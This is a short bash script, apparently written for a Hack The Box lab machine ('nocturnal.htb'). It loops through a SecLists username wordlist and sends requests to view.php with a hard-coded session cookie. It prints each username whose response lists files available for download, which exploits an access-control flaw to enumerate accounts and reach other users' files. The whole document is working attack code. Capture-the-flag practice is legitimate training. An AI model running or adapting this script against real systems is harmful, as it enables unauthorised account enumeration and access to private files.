#!/bin/bash

file="/usr/share/seclists/Usernames/xato-net-10-million-usernames.txt"
cookie="PHPSESSID=ehpcie2fohflp2n0tfe4hkk523"

# Loop through each username
while IFS= read -r username; do
    # Corrected line: Double-quote the URL string
    response=$(curl -s "http://nocturnal.htb/view.php?username=$username&file=pwn.pdf" --cookie "$cookie" | grep "Available files for download:")
    
    if [ -n "$response" ]; then
        echo "[+] $username"
    fi
done < "$file"